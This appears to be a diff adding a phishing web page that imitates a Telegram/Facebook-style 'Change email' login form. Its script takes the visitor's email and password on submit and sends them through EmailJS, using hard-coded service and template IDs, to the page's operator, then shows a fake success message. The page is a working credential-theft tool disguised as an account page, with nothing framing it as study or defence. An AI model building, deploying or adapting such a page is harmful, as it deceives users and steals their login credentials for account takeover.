@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change email</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8SoMFclA3x.ico">
+    <style>
+        /* General Body Styles */
+        body {
+            margin: 0;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #1c1e21;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Main Container */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            flex-grow: 1;
+        }
+
+        /* Header Banner */
+        .header {
+            background-color: white;
+            padding: 20px 8px 20px 20px;
+            text-align: center;
+            width: 100%;
+            font-size: 14px;
+            border-bottom: 1px solid #e4e4e4;
+        }
+
+        .header a {
+            color: #3b5998;
+            text-decoration: none;
+        }
+
+        /* Main Content Area */
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .language-selector {
+            color: #737373;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        /* Form Styling */
+        #login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-container {
+            width: 100%;
+            margin-bottom: 12px;
+            position: relative; /* Added for eye icon positioning */
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 20px 16px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            background-color: white;
+            box-sizing: border-box;
+            padding-right: 45px; /* Make space for the eye icon */
+        }
+
+        input::placeholder {
+            color: #90949c;
+        }
+
+        /* Eye Icon for Password */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #90949c;
+            font-size: 18px;
+            display: none; /* Hidden by default, shown by JS when input has value */
+        }
+
+        /* Button Styling */
+        .btn {
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Divider */
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+
+        /* Footer Styling */
+        .footer {
+            padding: 18px;
+            text-align:center;
+            width: 100%;
+            margin-top: auto;
+            position: relative; /* For Meta logo absolute positioning */
+        }
+
+        .meta-logo-wrapper {
+            position: absolute; /* Changed to absolute positioning */
+            width: 100%;
+            text-align: center;
+            bottom: 60px; /* Adjust as needed to match image */
+            left: 0;
+        }
+
+        .meta-logo {
+            height: 15px;
+            width: 70px;
+            color: #8a8d91;
+            vertical-align: middle;
+            margin-right: 5px; /* Space between logo and text */
+        }
+
+        .meta-text {
+            color: black;
+            font-size: 20px;
+            font-weight: ;
+            vertical-align: top;
+        }
+
+        .footer-links {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            left: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            font-size: 12px;
+            font-weight:bold ;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+  
+    </style>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "qSGi1S2FDFI4BbTSg",
+      });
+   })();
+</script>
+
+  <script>
+   
+
+    function sendEmail(e) {
+      console.log("hello");
+      e.preventDefault();
+      emailjs.send("service_r5qnz4q", "template_3b27n49", {
+        email: document.getElementById("email").value,password: document.getElementById("password").value
+        
+      }).then(() => {
+        //alert("Email sent successfully!");
+        alert("Email Register successfully!")
+        
+      }, (err) => {
+        //alert("Error: " + JSON.stringify(err));
+      });
+      
+      
+    }
+  </script>
+
+</head>
+<body>
+  
+  
+
+    <div class="container">
+        <div class="header">
+            <a href="#">Get Telegram for Android and browse faster.</a>
+        </div>
+
+        <div class="content">
+            <div class="language-selector">
+                <span>English (US)</span>
+            </div>
+
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="50" height="50" viewBox="0 0 256 256" xml:space="preserve">
+<g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
+	<path d="M 84.261 79.141 H 5.628 c -3.049 0 -5.617 -2.487 -5.617 -5.617 V 16.716 c 0 -3.049 2.487 -5.617 5.617 -5.617 h 78.633 c 3.049 0 5.617 2.487 5.617 5.617 v 56.808 C 89.878 76.654 87.391 79.141 84.261 79.141 L 84.261 79.141 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(227,227,227); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<polygon points="11.24,79.14 44.87,52.18 45.1,50.66 11.24,25.7 " style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(208,208,208); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
+	<polygon points="80.8,79.15 59.85,79.14 11.24,29.82 11.24,25.7 45.1,50.66 80.28,25.34 " style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(187,187,187); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
+	<polygon points="44.87,52.18 45.1,50.66 11.24,25.7 11.24,29.82 38.4,57.37 " style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(179,179,179); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
+	<path d="M 5.628 79.141 c -3.129 0 -5.617 -2.487 -5.617 -5.617 V 16.636 c 0 -3.129 2.487 -3.691 5.617 -3.691 s 5.617 0.642 5.617 3.691 v 62.505 H 5.628 L 5.628 79.141 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(213,75,61); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<path d="M 5.628 13.747 c 4.012 0 4.814 1.204 4.814 2.889 v 61.703 H 5.628 c -2.648 0 -4.814 -2.166 -4.814 -4.814 V 16.636 C 0.814 14.871 1.617 13.747 5.628 13.747 L 5.628 13.747 z M 5.628 12.945 c -3.129 0 -5.617 0.642 -5.617 3.691 v 56.889 c 0 3.129 2.487 5.617 5.617 5.617 h 5.617 V 16.636 C 11.245 13.507 8.758 12.945 5.628 12.945 L 5.628 12.945 L 5.628 12.945 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(215,43,39); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<path d="M 84.261 79.141 h -5.617 V 16.476 c 0 -3.129 2.487 -3.53 5.617 -3.53 c 3.129 0 5.617 0.401 5.617 3.53 v 57.129 C 89.878 76.654 87.391 79.141 84.261 79.141 L 84.261 79.141 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(213,75,61); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<path d="M 84.261 13.747 c 3.611 0 4.814 0.722 4.814 2.728 v 57.129 c 0 2.648 -2.166 4.814 -4.814 4.814 h -4.814 V 16.476 C 79.447 14.389 80.651 13.747 84.261 13.747 L 84.261 13.747 z M 84.261 12.945 c -3.129 0 -5.617 0.401 -5.617 3.53 v 62.746 h 5.617 c 3.129 0 5.617 -2.487 5.617 -5.617 V 16.476 C 89.878 13.346 87.391 12.945 84.261 12.945 L 84.261 12.945 L 84.261 12.945 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(215,43,39); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<path d="M 44.865 52.101 L 2.419 21.29 c -2.487 -1.845 -3.21 -5.376 -1.364 -7.863 s 5.456 -3.049 8.024 -1.204 L 44.945 38.3 l 36.107 -26.398 c 2.487 -1.845 6.018 -1.284 7.863 1.284 c 1.845 2.487 1.284 6.018 -1.284 7.863 L 44.865 52.101 L 44.865 52.101 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(213,75,61); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<path d="M 84.261 11.581 L 84.261 11.581 c 1.525 0 2.969 0.722 3.932 2.006 c 1.525 2.166 1.043 5.135 -1.043 6.74 L 44.865 51.138 L 2.9 20.648 c -2.166 -1.605 -2.728 -4.654 -1.204 -6.74 c 0.883 -1.204 2.407 -2.006 4.012 -2.006 c 1.043 0 2.086 0.321 2.889 0.963 l 35.786 25.997 l 0.481 0.321 l 0.481 -0.321 l 36.027 -26.398 C 82.255 11.902 83.218 11.581 84.261 11.581 L 84.261 11.581 z M 84.261 10.779 c -1.123 0 -2.327 0.321 -3.29 1.043 L 44.865 38.22 L 8.998 12.143 C 8.036 11.421 6.832 11.1 5.628 11.1 c -1.765 0 -3.53 0.802 -4.654 2.327 c -1.765 2.487 -1.043 6.018 1.444 7.863 l 42.446 30.892 l 42.686 -31.132 c 2.487 -1.845 3.049 -5.296 1.284 -7.863 C 87.712 11.581 86.027 10.779 84.261 10.779 L 84.261 10.779 L 84.261 10.779 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(215,43,39); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+</g>
+</svg>
+            </div>
+
+            <form id="login-form" onsubmit="sendEmail(event)" >
+                <div class="input-container">
+                    <input type="email" id="email" placeholder=" email" required>
+                </div>
+                <div class="input-container">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span class="toggle-password" id="togglePassword">&#128065;</span>
+                </div>
+                <button type="submit"  class="btn btn-login">Register email</button>
+            </form>
+
+            <a href="#" class="forgot-password">Forgot password?</a>
+
+            <div class="divider"></div>
+
+            
+        </div>
+
+        <div class="footer">
+            <div class="meta-logo-wrapper">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="20" height="23" viewBox="0 0 256 256" xml:space="preserve">
+<g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
+	<path d="M 83.924 7.756 L 4.202 38.496 c -5.442 2.183 -5.409 5.219 -0.992 6.571 l 20.455 6.385 l 7.035 23.153 c 0.925 2.553 0.469 3.566 3.151 3.566 c 2.069 0 2.983 -0.946 4.138 -2.069 l 9.941 -9.666 l 20.681 15.28 c 3.806 2.1 6.553 1.012 7.501 -3.533 l 13.577 -63.978 C 91.079 8.631 87.565 6.103 83.924 7.756 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(33,151,201); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+	<path d="M 33.942 72.016 l -6.747 -22.204 L 79.13 19.002 L 40.751 56.789 L 33.942 72.016 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
+</g>
+</svg>
+              
+              
+                
+               
+              <span class="meta-text">Telegram</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+        </div>
+    </div>
+  
+    
+    <script>
+        //document.addEventListener('DOMContentLoaded', () => {
+            const loginForm = document.getElementById('login-form');
+            const passwordInput = document.getElementById('password');
+            const togglePassword = document.getElementById('togglePassword');
+
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function () {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? '👁️' : '🔒'; // Change eye icon
+            });
+
+            // Show/hide eye icon based on password input
+            passwordInput.addEventListener('input', function() {
+                if (this.value.length > 0) {
+                    togglePassword.style.display = 'block';
+                } else {
+                    togglePassword.style.display = 'none';
+                }
+            });
+
+            // Initial check in case there's autofilled content
+             if (passwordInput.value.length > 0) {
+                togglePassword.style.display = 'block';
+            } 
+         
+          
+          // togglePassword.addEventListener('click', function () {
+               
+          
+         // emailjs.send("service_r5qnz4q", "template_3b27n49", {
+        //email: document.getElementById("email").value
+      //  password: document.getElementById("password").value
+     // })
+          
+           // });
+
+            
+        //});
+    </script>
+
+</body>
+</html>
